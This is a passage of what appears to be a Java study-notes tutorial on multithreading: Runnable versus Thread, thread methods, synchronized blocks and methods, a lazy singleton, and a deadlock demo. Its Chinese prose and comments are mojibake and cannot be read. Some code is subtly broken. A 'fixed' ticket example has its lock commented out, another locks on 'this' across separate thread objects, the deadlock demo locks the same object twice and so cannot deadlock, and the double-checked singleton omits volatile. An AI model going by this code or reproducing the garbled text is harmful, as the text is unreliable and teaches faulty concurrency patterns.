3.åˆ›å»ºå®ç°ç±»çš„å¯¹è±¡ * 4.å°†æ­¤å¯¹è±¡ä½œä¸ºå‚æ•°ä¼ é€’åˆ°Threadç±»çš„æ„é€ å™¨ä¸­ï¼Œåˆ›å»ºThreadçš„å¯¹è±¡ * 5.é€šè¿‡Threadçš„å¯¹è±¡è°ƒç”¨start() * */ public class MultiThreadTest2 { public static void main(String[] args) { // 3.åˆ›å»ºå®ç°ç±»çš„å¯¹è±¡ MyThread11 m11 = new MyThread11(); // 4.å°†æ­¤å¯¹è±¡ä½œä¸ºå‚æ•°ä¼ é€’åˆ°Threadç±»çš„æ„é€ å™¨ä¸­ï¼Œåˆ›å»ºThreadçš„å¯¹è±¡ Thread t1 = new Thread(m11);//ç±»ä¼¼äºå¤šæ€çš„æ€æƒ³ t1.setName("çº¿ç¨‹1"); // 5.é€šè¿‡Threadçš„å¯¹è±¡è°ƒç”¨start():(1)å¯åŠ¨çº¿ç¨‹ (2)è°ƒç”¨å½“å‰çº¿ç¨‹çš„run()-->è°ƒç”¨äº†Runnableç±»å‹ä¸­çš„targetçš„run t1.start(); //å†å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹,ç›´æ¥newä¸ªThreadï¼Œå…±ç”¨åŒä¸€ä¸ªRunnableçš„å®ä¾‹ Thread t2 = new Thread(m11); t2.setName("çº¿ç¨‹2"); t2.start(); } } //1.åˆ›å»ºä¸€ä¸ªå®ç°äº†Runnableæ¥å£çš„ç±» class MyThread11 implements Runnable{ // 2.å®ç°Runnableä¸­çš„æŠ½è±¡æ–¹æ³•: run() @Override public void run() { for (int i = 0; i &lt; 100; i++) { if(i % 2 == 0){ System.out.println(Thread.currentThread().getName() + ":" + i); } } } } ä¸å®Œå–„çš„ä¾‹å­ï¼šç”¨å®ç°Runnableæ¥å£çš„æ–¹å¼ï¼Œå®ç°å¤šçº¿ç¨‹ä¸‰ä¸ªçª—å£å”®ç¥¨ï¼Œæ€»ç¥¨æ•°ä¸º100å¼ ä¾‹å­ï¼ˆå¾…å®ç°çº¿ç¨‹å®‰å…¨é—®é¢˜ï¼‰ package cn.xpshuai.java1; /** * @author: xps * @create 2021-01-16 17:57 * @åŠŸèƒ½ï¼šç”¨å®ç°Runnableæ¥å£çš„æ–¹å¼ï¼Œå®ç°ç°å¤šçº¿ç¨‹ä¸‰ä¸ªçª—å£å”®ç¥¨ï¼Œæ€»ç¥¨æ•°ä¸º100å¼ ä¾‹å­ * å¾…è§£å†³ï¼Œä»ç„¶å­˜åœ¨çº¿ç¨‹å®‰å…¨é—®é¢˜ */ public class ThreadCase3 { public static void main(String[] args) { Windows2 w = new Windows2(); Thread t1 = new Thread(w); Thread t2 = new Thread(w); Thread t3 = new Thread(w); t1.setName("çª—å£1"); t2.setName("çª—å£2"); t3.setName("çª—å£3"); t1.start(); t2.start(); t3.start(); } } class Windows2 implements Runnable{ private int tickets = 100; //ä¸ç”¨åŠ staticäº†ï¼Œä½†è¿˜ä¼šæœ‰çº¿ç¨‹å®‰å…¨é—®é¢˜ @Override public void run() { while (true){ if (tickets > 0){ System.out.println(Thread.currentThread().getName() + ":å–ç¥¨ï¼Œç¥¨å·ä¸ºï¼š" + tickets); tickets--; }else { break; } } } } ä¸¤ç§åˆ›å»ºæ–¹å¼æ¯”è¾ƒå¼€å‘ä¸­ï¼Œç¬¬äºŒç§å®ç°Runnableæ¥å£çš„æ–¹å¼æ¯”è¾ƒå¥½ å¦‚æœç”¨ç¬¬ä¸€ç§æ–¹å¼ï¼Œè‹¥è¯¥ç±»å·²ç»å­˜åœ¨ä¸€ä¸ªçˆ¶ç±»ï¼Œè€ŒJavaåˆæ²¡æœ‰å¤šç»§æ‰¿,... ç¬¬äºŒç§æ–¹å¼ï¼Œä¸ä»…æ²¡æœ‰ç±»çš„å•ç»§æ‰¿æ€§çš„å±€é™æ€§ï¼Œè€Œä¸”å¤šä¸ªçº¿ç¨‹å¤©ç„¶çš„å°±é€‚åˆå¹¶å¯ä»¥å…±äº«æ•°æ® è”ç³»ï¼šThreadç±»æœ¬èº«ä¹Ÿå®ç°äº†Runnableæ¥å£ï¼Œä¸¤ç§æ–¹å¼éƒ½éœ€è¦é‡å†™run()ï¼Œå°†ç¨‹åºé€»è¾‘å†™åœ¨run()ä¸­ çº¿ç¨‹ä¸­å¸¸ç”¨çš„æ–¹æ³• package cn.xpshuai.java1; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create 2021-01-16 16:47 * @åŠŸèƒ½ï¼šæµ‹è¯•Threadä¸­çš„å¸¸ç”¨æ–¹æ³• * * * 1.start() :å¯åŠ¨å½“å‰çº¿ç¨‹ï¼›è°ƒç”¨å½“å‰çº¿ç¨‹çš„run()æ–¹æ³• * 2.run():é€šå¸¸éœ€è¦é‡å†™Threadç±»çš„æ­¤æ–¹æ³•ï¼Œå°†åˆ›å»ºçš„çº¿ç¨‹è¦è‡ªè¡Œçš„æ“ä½œå£°æ˜åœ¨æ­¤æ–¹æ³•ä¸­ * 3.currentThread()ï¼šé™æ€æ–¹æ³•ï¼Œè¿”å›æŒ‡å®šå½“å‰ä»£ç çš„çº¿ç¨‹ * 4.getName():è·å–å½“å‰çº¿ç¨‹çš„åå­— * 5.setName():è®¾ç½®å½“å‰çº¿ç¨‹çš„åå­— * 6.yield():çº¿ç¨‹è®©æ­¥ï¼Œæš‚åœã€‚é‡Šæ”¾å½“å‰CPUçš„æ‰§è¡Œ * 7.join():åœ¨çº¿ç¨‹Aä¸­è°ƒç”¨çº¿ç¨‹Bçš„join()ï¼Œæ­¤æ—¶çº¿ç¨‹Aå°±è¿›å…¥é˜»å¡ï¼Œç›´åˆ°çº¿ç¨‹Bå®Œå…¨æ‰§è¡Œå®Œä¹‹åï¼Œçº¿ç¨‹Aæ‰ç»“æŸé˜»å¡çŠ¶æ€ * 8.sleep(long millitime): è®©å½“å‰çº¿ç¨‹ç¡çœ æŒ‡å®šæ¯«ç§’æ•°(æœŸé—´å½“å‰çº¿ç¨‹æ˜¯é˜»å¡çŠ¶æ€)ï¼Œ è¿˜æ˜¯ä¸ªé™æ€æ–¹æ³• * 9.stop():å¼ºåˆ¶ç»“æŸå½“å‰çº¿ç¨‹ï¼ˆä¸æ¨èä½¿ç”¨ï¼‰ * 10.isAlive():åˆ¤æ–­å½“å‰çº¿ç¨‹çŸ¥å¦å­˜æ´» * * * * ã€çº¿ç¨‹çš„ä¼˜å…ˆçº§ã€‘ * MAX_PRIORITY:10 * MIN_PRIORITY:1 * NORM_PRIORITY:5 * * æ¶‰åŠçš„æ–¹æ³•ï¼š * getPriority()ï¼šè¿”å›çº¿ç¨‹ä¼˜å…ˆçº§ * setPriority(int newPriority):æ”¹å˜çº¿ç¨‹çš„ä¼˜å…ˆçº§ * * è¯´æ˜ï¼š * çº¿ç¨‹åˆ›å»ºæ—¶å€™ç»§æ‰¿çˆ¶çº¿ç¨‹çš„ä¼˜å…ˆçº§ *ä½ä¼˜å…ˆçº§åªæ˜¯è·å¾—è°ƒåº¦çš„æ¦‚ç‡ä½ï¼Œå¹¶éä¸€å®šæ˜¯åœ¨é«˜ä¼˜å…ˆçº§çº¿ç¨‹ä¹‹åæ‰è¢«è°ƒç”¨ * */ class HelloThread extends Thread{ @Override public void run() { for (int i = 0; i &lt; 100; i++) { if(i % 2 != 0){ try { sleep(1000); //æŠ›å‡ºå¼‚å¸¸ï¼Œéœ€è¦tryåŒ…è£¹èµ·æ¥(ä¸èƒ½throwsï¼Œå› ä¸ºä¸èƒ½æ¯”çˆ¶ç±»å¤§ï¼Œçˆ¶ç±»æ²¡æœ‰æŠ›å¼‚å¸¸) } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + Thread.currentThread().getPriority() + "-- å¥‡æ•° --" + i); } if(i % 20 ==0){ // this.yield(); yield(); } } } // //ä¹Ÿå¯ä»¥é€šè¿‡æ„é€ å™¨æ–¹å¼ç»™çº¿ç¨‹å‘½å // public HelloThread(String name){ // super(name); // } } public class ThreadMethod { public static void main(String[] args) throws InterruptedException { // HelloThread h1 = new HelloThread("çº¿ç¨‹çº¿ç¨‹1"); //é€šè¿‡æ„é€ å™¨æ–¹å¼ç»™çº¿ç¨‹å‘½å HelloThread h1 = new HelloThread(); h1.setName("çº¿ç¨‹1"); h1.setPriority(Thread.MAX_PRIORITY); //è®¾ç½®åˆ†çº¿ç¨‹çš„ä¼˜å…ˆçº§ h1.start(); //ç»™ä¸»çº¿ç¨‹å‘½å Thread.currentThread().setName("ä¸»çº¿ç¨‹"); for (int i = 0; i &lt; 100; i++) { if(i % 2 == 0){ System.out.println(Thread.currentThread().getName() + Thread.currentThread().getPriority() + ":" + i); } if(i == 20){ //è°ƒç”¨äº†å¦å¤–ä¸€ä¸ªçº¿ç¨‹çš„joinæ–¹æ³•ï¼Œç­‰ä»–æ‰§è¡Œå®Œå†ç»§ç»­å›æ¥æ‰§è¡Œ h1.join(); //éœ€è¦åŠ  throws } } h1.isAlive(); } } çº¿ç¨‹çš„è°ƒåº¦ æ—¶é—´ç‰‡ æŠ¢å å¼ï¼šé«˜ä¼˜å…ˆçº§çš„çº¿ç¨‹æŠ¢å CPU Javaçš„è°ƒåº¦æ–¹æ³• åŒä¼˜å…ˆçº§çº¿ç¨‹ç»„æˆå…ˆè¿›å…ˆå‡ºé˜Ÿåˆ—(å…ˆåˆ°å…ˆæœåŠ¡ï¼‰ï¼Œä½¿ç”¨æ—¶é—´ç‰‡ç­–ç•¥ å¯¹é«˜ä¼˜å…ˆçº§ï¼Œä½¿ç”¨ä¼˜å…ˆè°ƒåº¦çš„æŠ¢å å¼ç­–ç•¥ çº¿ç¨‹çš„ä¼˜å…ˆçº§ï¼š MAX_PRIORITY:10 MIN_PRIORITY:1 NORM_PRIORITY:5 æ¶‰åŠçš„æ–¹æ³•ï¼š getPriority()ï¼šè¿”å›çº¿ç¨‹ä¼˜å…ˆçº§ setPriority(int p):æ”¹å˜çº¿ç¨‹çš„ä¼˜å…ˆçº§ è¯´æ˜ï¼š çº¿ç¨‹åˆ›å»ºæ—¶å€™ç»§æ‰¿çˆ¶çº¿ç¨‹çš„ä¼˜å…ˆçº§ ä½ä¼˜å…ˆçº§åªæ˜¯è·å¾—è°ƒåº¦çš„æ¦‚ç‡ä½ï¼Œå¹¶éä¸€å®šæ˜¯åœ¨é«˜ä¼˜å…ˆçº§çº¿ç¨‹ä¹‹åæ‰è¢«è°ƒç”¨ çº¿ç¨‹çš„åˆ†ç±» å®ˆæŠ¤çº¿ç¨‹ ç”¨æˆ·çº¿ç¨‹ å®ƒä»¬åœ¨å‡ ä¹æ¯ä¸ªæ–¹é¢éƒ½æ˜¯ç›¸åŒçš„ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯åˆ¤æ–­JVMä½•æ—¶ç¦»å¼€ã€‚ å®ˆæŠ¤çº¿ç¨‹æ˜¯ç”¨æ¥æœåŠ¡ç”¨æˆ·çº¿ç¨‹çš„ï¼Œé€šè¿‡åœ¨start()æ–¹æ³•å‰è°ƒç”¨thread.setDaemon(true)å¯ä»¥æŠŠä¸€ä¸ªç”¨æˆ·çº¿ç¨‹å˜æˆä¸€ä¸ªå®ˆæŠ¤çº¿ç¨‹ã€‚ Javaåƒåœ¾å›æ”¶å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„å®ˆæŠ¤çº¿ç¨‹ã€‚è‹¥JVMä¸­éƒ½æ˜¯å®ˆæŠ¤çº¿ç¨‹ï¼Œå½“å‰JVMå°†é€€å‡ºã€‚ å½¢è±¡ç†è§£ï¼šå…”æ­»ç‹—çƒ¹ï¼Œé¸Ÿå°½å¼“è— çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸ è¿™ä¸ªç”Ÿå‘½å‘¨æœŸæµç¨‹å›¾éœ€è¦è®°ä½ï¼ï¼ï¼ çº¿ç¨‹çš„åŒæ­¥(é‡éš¾ç‚¹) è§£å†³çš„æ˜¯çº¿ç¨‹å®‰å…¨çš„é—®é¢˜ é—®é¢˜çš„æå‡ºï¼š å¤šä¸ªçº¿ç¨‹æ‰§è¡Œçš„ä¸ç¡®å®šæ€§å¼•èµ·æ‰§è¡Œç»“æœçš„ä¸ç¨³å®šå¤šä¸ªçº¿ç¨‹å¯¹è´¦æœ¬çš„å…±äº«ï¼Œä¼šé€ æˆæ“ä½œçš„ä¸å®Œæ•´æ€§ï¼Œä¼šç ´åæ•°æ®ã€‚ è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜å…±æœ‰ä¸‰ç§æ–¹å¼ï¼š1.åŒæ­¥ä»£ç å—package cn.xpshuai.java2; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create 2021-01-17 9:14 * @åŠŸèƒ½ï¼šä½¿ç”¨åŒæ­¥ä»£ç å—ï¼Œè§£å†³å‰é¢é€šè¿‡å®ç°Runnableæ–¹æ³•å®ç°çš„3ä¸ªçª—å£åŒæ—¶å–100å¼ ç¥¨å‡ºç°é‡ç¥¨ã€é”™ç¥¨çš„çš„çº¿ç¨‹å®‰å…¨é—®é¢˜ é—®é¢˜ï¼šå‡ºç°äº†é‡ç¥¨ã€é”™ç¥¨-->å‡ºç°äº†çº¿ç¨‹çš„å®‰å…¨é—®é¢˜ åŸå› ï¼šå½“æŸä¸ªçº¿ç¨‹æ“ä½œè½¦ç¥¨è¿‡ç¨‹ä¸­ï¼Œå°šæœªæ“ä½œå®Œæˆæ—¶ï¼Œå…¶ä»–çº¿ç¨‹å‚ä¸è¿›æ¥ï¼Œä¹Ÿæ“ä½œè½¦ç¥¨ è§£å†³ï¼šå½“ä¸€ä¸ªçº¿ç¨‹åœ¨æ“ä½œè´¡çŒ®æ•°æ®çš„æ—¶å€™ï¼Œå…¶ä»–çº¿ç¨‹ä¸èƒ½å‚ä¸è¿›æ¥ï¼Œç›´åˆ°çº¿ç¨‹Aæ“ä½œå®Œå…¶ä»–çº¿ç¨‹æ‰å¯ä»¥å¼€å§‹æ“ä½œå…±äº«æ•°æ®ï¼Œ å³æ˜¯çº¿ç¨‹Aå‡ºç°äº†é˜»å¡ï¼Œä¹Ÿä¸èƒ½è¢«æ”¹å˜ã€‚åŠ é”ã€‚ åœ¨Javaä¸­ï¼šé€šè¿‡åŒæ­¥æœºåˆ¶æ¥è§£å†³çº¿ç¨‹çš„å®‰å…¨é—®é¢˜ æ–¹å¼1ï¼šåŒæ­¥ä»£ç å— synchronized(åŒæ­¥ç›‘è§†å™¨){ //éœ€è¦è¢«åŒæ­¥çš„ä»£ç ï¼šå³æ“ä½œå…±äº«æ•°æ®(å¤šä¸ªçº¿ç¨‹å…±åŒæ“ä½œçš„å˜é‡)çš„ä»£ç (ä¸èƒ½åŒ…å«ä»£ç å¤šäº†ï¼Œä¹Ÿä¸èƒ½åŒ…å«ä»£ç å°‘äº†-->åªåŒ…å«æ“ä½œçš„ä»£ç ) } è¯´æ˜ï¼šåŒæ­¥ç›‘è§†å™¨-->ä¿—ç§°ï¼šé”ã€‚ä»»ä½•ä¸€ä¸ªç±»çš„å¯¹è±¡éƒ½å¯ä»¥å……å½“é” è¦æ±‚ï¼šå¤šä¸ªçº¿ç¨‹å¿…é¡»å…±ç”¨åŒä¸€æŠŠé”(å”¯ä¸€çš„) åŒæ­¥çš„æ–¹å¼ï¼šè§£å†³äº†çº¿ç¨‹çš„å®‰å…¨é—®é¢˜ -- å¥½å¤„ æ“ä½œåŒæ­¥ä»£ç æ—¶ï¼Œåªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹å‚ä¸ï¼Œå…¶ä»–çº¿ç¨‹ç­‰å¾…ï¼Œç›¸å½“äºæ˜¯ä¸€ä¸ªå•çº¿ç¨‹çš„è¿‡ç¨‹ï¼Œæ•ˆç‡ä½ --ä¸è¶³ä¹‹å¤„ è¡¥å……: åœ¨å®ç°Runnableæ¥å£åˆ›å»ºå¤šçº¿ç¨‹çš„æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨thisä½œä¸ºåŒæ­¥ç›‘è§†å™¨ æ–¹å¼2ï¼šåŒæ­¥æ–¹æ³• å¦‚æœæ“ä½œå…±äº«æ•°æ®çš„ä»£ç å®Œæ•´çš„å£°æ˜åœ¨ä¸€ä¸ªæ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬ä¸å¦¨å°†æ­¤æ–¹æ³•å£°æ˜ä¸ºåŒæ­¥çš„ synchronized æ“ä½œæ–¹æ³•_name(){ //æ“ä½œå…±äº«æ•°æ®çš„ä»£ç å— } å…³äºåŒæ­¥æ–¹æ³•çš„æ€»ç»“: 1.åŒæ­¥æ–¹æ³•ä»ç„¶æ¶‰åŠåˆ°åŒæ­¥ç›‘è§†å™¨ï¼Œåªæ˜¯ä¸éœ€è¦æˆ‘ä»¬æ˜¾å¼çš„å£°æ˜ã€‚ 2ï¼éé™æ€çš„åŒæ­¥æ–¹æ³•ï¼ŒåŒæ­¥ç›‘è§†å™¨æ˜¯:this é™æ€çš„åŒæ­¥æ–¹æ³•ï¼ŒåŒæ­¥ç›‘è§†å™¨æ˜¯:å½“å‰ç±»æœ¬èº« */ public class ThreadCase4 { public static void main(String[] args) { Windows2 w = new Windows2(); Thread t1 = new Thread(w); Thread t2 = new Thread(w); Thread t3 = new Thread(w); t1.setName("çª—å£1"); t2.setName("çª—å£2"); t3.setName("çª—å£3"); t1.start(); t2.start(); t3.start(); } } class Windows2 implements Runnable{ private int tickets = 100; //å…±äº«æ•°æ® // Object obj = new Object(); //è¿™é‡Œçš„å¯¹è±¡æ˜¯å”¯ä¸€çš„å°±è¡Œ(å¤šä¸ªçº¿ç¨‹ç”¨çš„æ˜¯åŒä¸€ä¸ª) @Override public void run() { while (true){ // synchronizedä¸èƒ½åŒ…å¤šï¼Œæ¯”å¦‚ä¸èƒ½æŠŠwhile(true)åŒ…è¿›æ¥-->å¦åˆ™å°±æˆäº†åªæœ‰ä¸€ä¸ªçª—å£å–ç¥¨äº† // synchronized(Windows2.class){ //ç›‘è§†å™¨æ–¹å¼1ï¼šè¿™é‡Œå¯ä»¥ç”¨å½“å‰ç±»ä½œä¸ºç›‘è§†å™¨(ç±»ä¹Ÿæ˜¯å¯¹è±¡)ï¼Œæ˜¯å”¯ä¸€çš„(åªä¼šåŠ è½½ä¸€æ¬¡) // ç›‘è§†å™¨æ–¹å¼2ï¼šsynchronized (obj){ //è¿™é‡Œä¸èƒ½ç”¨this(ä»£è¡¨t1,t2,t3å¯¹è±¡ï¼Œä¸å”¯ä¸€)ä½œä¸ºåŒæ­¥ç›‘è§†å™¨ if (tickets > 0){ try { Thread.sleep(100); //å…ˆåŠ äº†sleepå¼ºåˆ¶é˜»å¡ï¼Œè®©å‡ºç°é”™ç¥¨çš„æ¦‚ç‡æå‡äº† } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + ":å–ç¥¨ï¼Œç¥¨å·ä¸ºï¼š" + tickets); tickets--; }else { break; } } } } } package cn.xpshuai.java2; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create 2021-01-17 9:47 * @åŠŸèƒ½ï¼š ä½¿ç”¨åŒæ­¥ä»£ç å—ï¼Œè§£å†³å‰é¢é€šè¿‡ç»§æ‰¿Threadæ–¹å¼å®ç°çš„3ä¸ªçª—å£åŒæ—¶å–100å¼ ç¥¨å‡ºç°é‡ç¥¨ã€é”™ç¥¨çš„çš„çº¿ç¨‹å®‰å…¨é—®é¢˜ è¯´æ˜ï¼šåœ¨é€šè¿‡ç»§æ‰¿Threadåˆ›å»ºå¤šæ–¹å¼ï¼Œæ…ç”¨thisä½œä¸ºåŒæ­¥ç›‘è§†å™¨ï¼Œè€ƒè™‘ä½¿ç”¨å½“å‰ç±»ä½œä¸ºåŒæ­¥ç›‘è§†å™¨ï¼ˆè€ƒè™‘æ˜¯ä¸æ˜¯å”¯ä¸€çš„ï¼‰ */ public class ThreadCase5 { public static void main(String[] args) { Windows w1 = new Windows(); Windows w2 = new Windows(); Windows w3 = new Windows(); w1.setName("çª—å£1"); w2.setName("çª—å£2"); w3.setName("çª—å£3"); w1.start(); w2.start(); w3.start(); } } class Windows extends Thread{ private static int tickets = 100; //åŠ äº†staticä¹Ÿä¸å¯¹ï¼Œéœ€è¦è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜ // private static Object obj = new Object(); //ä¸å”¯ä¸€ï¼Œæ‰€ä»¥åŠ static @Override public void run() { while (true){ // ç›‘è§†å™¨æ–¹å¼1ï¼šä¸ºäº†æ›´ç®€ä¾¿,ç”¨å½“å‰å¯¹è±¡æ¥ä½œä¸ºç›‘è§†å™¨ï¼Œè¿™é‡Œçš„thisï¼šå”¯ä¸€çš„Windowå¯¹è±¡ synchronized(this){ // ç›‘è§†å™¨æ–¹å¼2ï¼šsynchronized(obj) if (tickets > 0){ try { Thread.sleep(100); //ä½¿å¾—é”™ç¥¨æ¦‚ç‡å˜å¤§ } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + ":å–ç¥¨ï¼Œç¥¨å·ä¸ºï¼š" + tickets); tickets--; }else { break; } } } } } 2.åŒæ­¥æ–¹æ³•package cn.xpshuai.java2; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create 2021-01-17 10:04 * @åŠŸèƒ½ï¼šä½¿ç”¨åŒæ­¥æ–¹æ³•ï¼Œè§£å†³é€šè¿‡Runnableå®ç°çš„æŠ¢ç¥¨çš„å®‰å…¨é—®é¢˜ * * * *ã€å…³äºåŒæ­¥æ–¹æ³•çš„æ€»ç»“ã€‘: * 1.åŒæ­¥æ–¹æ³•ä»ç„¶æ¶‰åŠåˆ°åŒæ­¥ç›‘è§†å™¨ï¼Œåªæ˜¯ä¸éœ€è¦æˆ‘ä»¬æ˜¾å¼çš„å£°æ˜ã€‚ * 2ï¼éé™æ€çš„åŒæ­¥æ–¹æ³•ï¼ŒåŒæ­¥ç›‘è§†å™¨æ˜¯:this * é™æ€çš„åŒæ­¥æ–¹æ³•ï¼ŒåŒæ­¥ç›‘è§†å™¨æ˜¯:å½“å‰ç±»æœ¬èº« * * * * */ public class ThreadCase6 { public static void main(String[] args) { Windows3 w = new Windows3(); Thread t1 = new Thread(w); Thread t2 = new Thread(w); Thread t3 = new Thread(w); t1.setName("çª—å£1"); t2.setName("çª—å£2"); t3.setName("çª—å£3"); t1.start(); t2.start(); t3.start(); } } class Windows3 implements Runnable{ private int tickets = 100; //å…±äº«æ•°æ® @Override public void run() { while (true){ show(); } } // åŒæ­¥ç›‘è§†å™¨ï¼šthisï¼Œåªæ˜¯çœç•¥äº†æ²¡å†™ private synchronized void show(){ //æŠŠæ“ä½œä»£ç å•ç‹¬æå‡ºæ¥ï¼Œä¸èƒ½å¤šæä¹Ÿä¸èƒ½å°‘æ if (tickets > 0){ try { Thread.sleep(100); //å…ˆåŠ äº†sleepå¼ºåˆ¶é˜»å¡ï¼Œè®©å‡ºç°é”™ç¥¨çš„æ¦‚ç‡æå‡äº† } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + ":å–ç¥¨ï¼Œç¥¨å·ä¸ºï¼š" + tickets); tickets--; } } } package cn.xpshuai.java2; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create 2021-01-17 10:10 * @åŠŸèƒ½ï¼š ä½¿ç”¨åŒæ­¥æ–¹æ³•ï¼Œè§£å†³é€šè¿‡ç»§æ‰¿Threadç±»çš„æ–¹å¼å®ç°çš„æŠ¢ç¥¨çš„å®‰å…¨é—®é¢˜ */ public class ThreadCase7 { public static void main(String[] args) { Windows4 w1 = new Windows4(); Windows4 w2 = new Windows4(); Windows4 w3 = new Windows4(); w1.setName("çª—å£1"); w2.setName("çª—å£2"); w3.setName("çª—å£3"); w1.start(); w2.start(); w3.start(); } } class Windows4 extends Thread{ private static int tickets = 100; //åŠ äº†staticä¹Ÿä¸å¯¹ï¼Œéœ€è¦è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜ @Override public void run() { while (true){ show(); } } private static synchronized void show(){ //æŠŠæ–¹æ³•å†™å‡ºé™æ€çš„ï¼Œç›‘è§†å™¨å”¯ä¸€(ä¸ºWindows.class)ï¼Œæ­£ç¡® // private synchronized void show(){ æŒ‰ç…§å‰é¢çš„æ–¹å¼ç›´æ¥åŠ synchronizedæ˜¯ä¸è¡Œçš„(å› ä¸ºç›‘è§†å™¨ä¸æ˜¯å”¯ä¸€çš„åŒä¸€ä¸ª)ï¼Œé”™è¯¯çš„å†™æ³• if (tickets > 0){ try { Thread.sleep(100); //ä½¿å¾—é”™ç¥¨æ¦‚ç‡å˜å¤§ } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + ":å–ç¥¨ï¼Œç¥¨å·ä¸ºï¼š" + tickets); tickets--; } } } å°†å•ä¾‹æ¨¡å¼çš„æ‡’æ±‰å¼ï¼Œæ”¹æˆçº¿ç¨‹å®‰å…¨çš„ï¼š package cn.xpshuai.java2; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create 2021-01-17 10:27 * @åŠŸèƒ½ï¼šä½¿ç”¨åŒæ­¥æœºåˆ¶ï¼Œå°†å•ä¾‹æ¨¡å¼çš„æ‡’æ±‰å¼ï¼Œæ”¹æˆçº¿ç¨‹å®‰å…¨çš„ */ public class BankTest { } class Bank{ private Bank(){ } private static Bank instance = null; //æ‡’æ±‰å¼ public static Bank getInstance() { //åŒæ­¥é”ä¸ºå½“å‰ç±»æœ¬èº«(Bank.class) //æ–¹å¼1(åŒæ­¥ä»£ç å—/åŒæ­¥æ–¹æ³•)ï¼šæ•ˆç‡ç¨å·® // synchronized(Bank.class){ // if(instance == null){ // instance = new Bank(); // } // return instance; // } //æ–¹å¼2ï¼šæ•ˆç‡è¾ƒé«˜ if(instance == null){ //åŒé‡æ£€æŸ¥ synchronized(Bank.class){ if(instance == null){ instance = new Bank(); } } } return instance; } } 3.Locké”æ–¹å¼æ­»é”çš„é—®é¢˜ï¼š æ­»é”ï¼š ä¸åŒçš„çº¿ç¨‹åˆ†åˆ«å ç”¨å¯¹æ–¹éœ€è¦çš„åŒæ­¥èµ„æºä¸æ”¾å¼ƒï¼Œéƒ½åœ¨ç­‰å¾…å¯¹æ–¹æ”¾å¼ƒè‡ªå·±éœ€è¦çš„åŒæ­¥èµ„æºï¼Œå°±å½¢æˆäº†çº¿ç¨‹çš„æ­»é”å‡ºç°æ­»é”åï¼Œä¸ä¼šå‡ºç°å¼‚å¸¸ï¼Œä¸ä¼šå‡ºç°æç¤ºï¼Œåªæ˜¯æ‰€æœ‰çš„çº¿ç¨‹éƒ½å¤„äºé˜»å¡çŠ¶æ€ï¼Œæ— æ³•ç»§ç»­ è§£å†³æ–¹æ³•ï¼š ä¸“é—¨çš„ç®—æ³•ã€åŸåˆ™ å°½é‡å‡å°‘åŒæ­¥èµ„æºçš„å®šä¹‰&gt;å°½é‡é¿å…åµŒå¥—åŒæ­¥ æ­»é”ä¾‹å­ï¼š package cn.xpshuai.java2; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create 2021-01-17 10:42 * @åŠŸèƒ½ï¼šå‡ºç°äº†æ­»é” * * *1.æ­»é”çš„ç†è§£:ä¸åŒçš„çº¿ç¨‹åˆ†åˆ«å ç”¨å¯¹æ–¹éœ€è¦çš„åŒæ­¥èµ„æºä¸æ”¾å¼ƒï¼Œéƒ½åœ¨ç­‰å¾…å¯¹æ–¹æ”¾å¼ƒè‡ªå·±éœ€è¦çš„åŒæ­¥èµ„æºï¼Œå°±å½¢æˆäº†çº¿ç¨‹çš„æ­»é” * *2.è¯´æ˜: * 1ï¼‰å‡ºç°æ­»é”åï¼Œä¸ä¼šå‡ºç°å¼‚å¸¸ï¼Œä¸ä¼šå‡ºç°æç¤ºï¼Œåªæ˜¯æ‰€æœ‰çš„çº¿ç¨‹éƒ½å¤„äºé˜»å¡çŠ¶æ€ï¼Œæ— æ³•ç»§ç»­ * 2ï¼‰æˆ‘ä»¬ä½¿ç”¨åŒæ­¥æ—¶,è¦é¿å…å‡ºç°æ­»é”ã€‚| * */ public class LuckTest { public static void main(String[] args) { StringBuffer s1 = new StringBuffer(); StringBuffer s2 = new StringBuffer(); // ç”¨åŒ¿åæ–¹å¼å†™ç»§æ‰¿Threadç±»çš„æ–¹å¼ new Thread(){ @Override public void run() { synchronized (s1){ s1.append("a"); s2.append("1"); try { Thread.sleep(100); //å¢åŠ æ­»é”å‡ºç°çš„æ¦‚ç‡ } catch (InterruptedException e) { e.printStackTrace(); } synchronized (s2){ s1.append("b"); s2.append("2"); System.out.println(s1); System.out.println(s2); } } } }.start(); // ç”¨åŒ¿åæ–¹å¼å†™å®ç°Runnableæ¥å£çš„æ–¹å¼ new Thread(new Runnable() { @Override public void run() { synchronized (s2){ s1.append("c"); s2.append("3"); try { Thread.sleep(100); //å¢åŠ æ­»é”å‡ºç°çš„æ¦‚ç‡ } catch (InterruptedException e) { e.printStackTrace(); } synchronized (s2){ s1.append("d"); s2.append("4"); System.out.println(s1); System.out.println(s2); } } } }).start(); } } Locké”æ–¹å¼è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜ï¼š package cn.xpshuai.java2; import java.util.concurrent.locks.ReentrantLock; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create 2021-01-17 11:10 * @åŠŸèƒ½ï¼šè§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜çš„æ–¹å¼ä¸‰ï¼šLocké” -- JDK5.0æ–°å¢ * æ­¥éª¤åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼š 